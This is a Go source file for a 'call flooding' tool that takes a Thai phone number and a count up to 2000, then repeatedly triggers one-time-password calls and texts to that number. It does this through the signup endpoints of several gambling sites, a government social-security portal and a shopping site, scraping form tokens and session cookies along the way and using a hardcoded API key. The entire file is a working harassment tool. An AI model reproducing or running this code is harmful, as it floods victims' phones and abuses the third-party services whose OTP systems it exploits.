package main

import (
  "fmt"
  "os/exec"
  "io/ioutil"
  "net/http"
  "strings"
  "time"
  "log"
  "math/rand"
  "github.com/gookit/color"
)

func Contains(blacklist []string, value string) bool {

	for _, v := range blacklist {

		if v == value {
			return true
		}
	}
	return false
}

func randomString(l int) string {
	var pool = "abcdefghijklmnopqrstuvwxyzABCEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, l)
	for i := 0; i < l; i++ {
		bytes[i] = pool[rand.Intn(len(pool))]
	}
	return string(bytes)
}
func randt() {
  rand.Seed(time.Now().UTC().UnixNano())
}

func api1(phone string) {
  url := "https://referral.huaydee.com/v1/sendotp"
  data := strings.NewReader(`{"phone": "+66` + phone + `"}`)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
}
  client := &http.Client{Transport: tr}
  req, err := http.NewRequest("POST", url, data)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req.Header.Add("x-api-key", "0tWnR4S38L6MD3aysXVjF83M0qaIwfdm1AeiiNDn")
  req.Header.Add("Content-Type", "application/json")
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer resp.Body.Close()
  if resp.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] api1 sent\n",time.Now().Format("15:04:05"))
    //fmt.Printf("[INFO] api1 sent %d\n", resp.StatusCode)
  } else {
    //fmt.Println(err)
    fmt.Printf("%d", resp.StatusCode)
  }
}

func apicall1(phone string) {
  req, err := http.NewRequest("GET", "https://www.allcasino.bet/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://www.allcasino.bet/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    fmt.Println(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 1 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
  }
}

func apicall2(phone string) {
  req, err := http.NewRequest("GET", "https://ez55.co/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://ez55.co/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 2 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
  }
}

func apicall3(phone string) {
  req, err := http.NewRequest("GET", "https://sexygaming.bet/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://sexygaming.bet/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 3 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
  }
}

func apicall4(phone string) {
  req, err := http.NewRequest("GET", "https://pretty.bet/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://pretty.bet/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 4 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
  }
}

func apicall5(phone string) {
  req, err := http.NewRequest("GET", "https://allbet.co/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://allbet.co/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 5 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
 }
}

func apicall6(phone string) {
  req, err := http.NewRequest("GET", "https://1ufabet.com/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://1ufabet.com/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 6 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
 }
}

func apicall7(phone string) {
  req, err := http.NewRequest("GET", "https://wm55.co/_ajax_/register", nil)
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  resp, err := client.Do(req)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
    
  }
  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
  if len(a) != 2 {
    fmt.Println(len(a))
  }
  token := strings.Split(a[1], `" />`)[0]
  setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
  data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
  req2, err := http.NewRequest("POST", "https://wm55.co/_ajax_/request-otp", data)
  client2 := &http.Client{Transport: tr}
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
  res2, err := client2.Do(req2)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  defer res2.Body.Close()
  if res2.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call 7 sent\n",time.Now().Format("15:04:05"))
  } else {
    //fmt.Println("yahoooo")
    fmt.Printf("%d", res2.StatusCode)
 }
}

func api2(phone string) {
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  client := &http.Client{Transport: tr}
  data := strings.NewReader("dCard=1358231116147&Mobile=" + phone + "&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
  req, err := http.NewRequest("POST", "https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp", data)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req.Header.Add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
  req.Header.Add("X-Requested-With", "XMLHttpRequest")
  resp, err := client.Do(req)
  if err != nil {
    log.Fatalln(err)
  }
  defer resp.Body.Close()
  if resp.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] api 2 sent\n",time.Now().Format("15:04:05"))
  } else {
    fmt.Printf("%d", resp.StatusCode)
  }
}

func api3(phone string) {
  tr := &http.Transport {
	MaxIdleConns:       1,
	IdleConnTimeout:    1 * time.Second,
	DisableCompression: true,
    
  }
  
  client := &http.Client{Transport: tr}
  data := strings.NewReader("phone=" + phone + "&type=reg&platform=1")
  req, err := http.NewRequest("POST", "https://www.konvy.com/ajax/system.php?action=get_phone_code", data)
  if err != nil {
    //fmt.Println(err)
    log.Fatalln(err)
  }
  req.Header.Add("X-Requested-With", "XMLHttpRequest")
  req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36")
  resp, err := client.Do(req)
  if err != nil {
    log.Fatalln(err)
  }
  defer resp.Body.Close()
  if resp.StatusCode == 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] api 3 sent\n",time.Now().Format("15:04:05"))
    //fmt.Printf("test %d\n", resp.StatusCode)
  } else {
    fmt.Printf("%d", resp.StatusCode)
  }
}


func allapi(phone string, amount int) {
  //api3(phone)
  /*apicall1(phone)
  apicall2(phone)
  apicall3(phone)
  apicall4(phone)
  apicall5(phone)*/
}

func sms1(phone string, amount int) {
  api1(phone)
}

func sms2(phone string, amount int) {
  api2(phone)
}

func sms3(phone string, amount int) {
  api3(phone)
}

func call1(phone string, amount int) {
  apicall1(phone)
}
func call2(phone string, amount int) {
  apicall2(phone)
}
func call3(phone string, amount int) {
  apicall3(phone)
}
func call4(phone string, amount int) {
  apicall4(phone)
}
func call5(phone string, amount int) {
  apicall5(phone)
}

func call6(phone string, amount int) {
  apicall6(phone)
}

func call7(phone string, amount int) {
  apicall7(phone)
}

func main() {
  out, err := exec.Command("clear").Output()
  if err != nil {
    log.Fatalln(err)
  }
  output := string(out[:])
    fmt.Println(output)
  blacklist := []string{"191", "1190", "1192", "1193", "1196", "1197", "1154", "1155", "1134", "1669", "1691"}
	limit := 2000
	var number string
	var amount int
	color.Blue.Printf(`
	
   
     ██████╗ █████╗ ██╗     ██╗     
    ██╔════╝██╔══██╗██║     ██║     
    ██║     ███████║██║     ██║     
    ██║     ██╔══██║██║     ██║     
    ╚██████╗██║  ██║███████╗███████╗
     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
      
      
      call flooding 5api v 1.0.0
      made by Kiraa.#4731                       
  
  `)
	fmt.Println()
	//fmt.Println("PHONE :")
	//rand.Seed(time.Now().UTC().UnixNano())
	//fmt.Sprintf("Start Time: %s\n", time.Now())
	//, .Format("15:04:05"))
	color.Blue.Printf("phonenumber : \n")
	fmt.Scanln(&number)
	//fmt.Println("AMOUNT :")
	color.Blue.Printf("amounta : \n")
	fmt.Scanln(&amount)
	if len([]rune(number)) == 10 && number[0] == '0' && !Contains(blacklist, number) {
		if amount <= limit {
			fmt.Println()
			for i := 0; i < amount; i++ {
			  done := 6
			  switch rand.Intn(done + 1) {
			    case 0:
			    go call1(number,amount) //waiting config deley
			    time.Sleep(20 * time.Second)
			    //go Startall(number,amount)
			    case 1:
			    go call2(number,amount)
			    time.Sleep(20 * time.Second)
			    case 2:
			    go call3(number,amount)
			    time.Sleep(20 * time.Second)
			    case 3:
			    go call4(number,amount)
			    time.Sleep(20 * time.Second)
			    case 4:
			    go call5(number,amount)
			    time.Sleep(20 * time.Second)
			    case 5:
			    go call6(number,amount)
			    time.Sleep(20 * time.Second)
			    case 6:
			    go call7(number,amount)
			    time.Sleep(20 * time.Second)
			  }
				//go Startall(number, amount)
				//รอทำsmsเทรดเยอะ
			}
			
			fmt.Scanln()

		} else {
			fmt.Printf("The limit is %d", limit)
		}
	} else {
		fmt.Println("Number is invalid or blacklisted")
	}
}